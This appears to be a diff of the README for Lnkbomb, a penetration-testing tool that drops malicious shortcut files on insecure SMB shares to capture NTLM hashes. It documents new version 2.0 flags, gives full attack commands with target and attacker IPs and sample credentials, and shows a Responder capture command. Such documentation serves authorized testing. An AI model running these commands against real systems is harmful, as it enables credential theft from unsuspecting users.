@@ -10,6 +10,8 @@ Lnkbomb is used for uploading malicious shortcut files to insecure file shares. 
 
 The payload file is uploaded directly to the insecure file specified by the tester in the command line. The tester includes their IP address as well, which is written into the payload.
 
+Version 2.0 is a total rebuild of the tool and uses the pysmb library, permitting unauthenticated and authenticated payload drops.
+
 ## Python Usage
 Installing Lnkbomb
 
@@ -25,20 +27,26 @@ This will output the help menu, which contains the following flags:
 
 ```-h, --help - Lists the help options```
 
-```-t, --target - Specifies the target file share (ex. -t \\192.168.1.1\Share)```
+```-t, --target - Specifies the target IP address```
 
-```-a, --attacker - Specifies the tester's attack machine (ex. -a 192.168.1.2)```
+```-a, --attacker - Specifies the tester's attack machine IP address```
 
-```-r, --recover - Used to remove the payload when testing is completed (ex. -r randomfilegenerated.recover)```
+```-r, --recover - Used to remove the payload when testing is completed (ex. -r payloadname.url)```
+
+```-w, --windows - New command - required for setting appropriate ports for Windows shares```
+
+```-l, --linux - New command - required for setting appropriate ports for Linux shares
+
+```-n, --netbios - New command - netbios name for targeted Windows machines must be included```
 
 Examples of full commands include:
 
-```python3 lnkbomb.py -t \\192.168.1.1\Share -a 192.168.1.2```
+```python3 .\lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u themayor -p Password123! -n dc01 --windows```
 
-```python3 lnkbomb.py -r randomfilegenerated.recover```
+```python3 .\lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u themayor -p Password123! -n dc01 --windows -r dicnwdsebl.url```
 
 You will need to utilize a tool like Responder or smbserver to capture the NTLM hash.  
-```responder -I eth0 -dwf -v```
+```responder -I eth0 -dwFP -v```
 
 or
 
